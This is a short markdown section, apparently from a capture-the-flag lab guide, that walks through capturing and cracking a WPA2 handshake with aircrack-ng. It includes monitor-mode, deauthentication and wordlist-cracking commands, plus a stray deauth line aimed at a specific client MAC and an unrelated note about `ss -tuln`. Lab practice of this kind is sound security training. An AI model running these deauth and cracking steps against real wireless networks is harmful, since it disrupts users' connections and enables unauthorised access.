## Advanced: Using Aircrack-ng Suite (Linux)

For a more sophisticated approach, you can capture the WPA2 handshake and crack it offline:

```
# 1. Put WiFi adapter in monitor mode
sudo airmon-ng start wlan0

# 2. Scan for networks
sudo airodump-ng wlan0mon

# 3. Capture handshake (note the channel and BSSID of CTF_LAB)
sudo airodump-ng -c <channel> --bssid <BSSID> -w ctf_capture wlan0mon

# 4. In another terminal, deauth a client to force handshake
sudo aireplay-ng -0 1 -a <BSSID> wlan0mon

# 5. Once handshake is captured, crack it
aircrack-ng -w 10k-most-common.txt ctf_capture-01.cap
```

sudo aireplay-ng -0 1 -c 40:C7:3C:4C:32:FE wlan0mon


`ss -tuln` might show differently for different OS 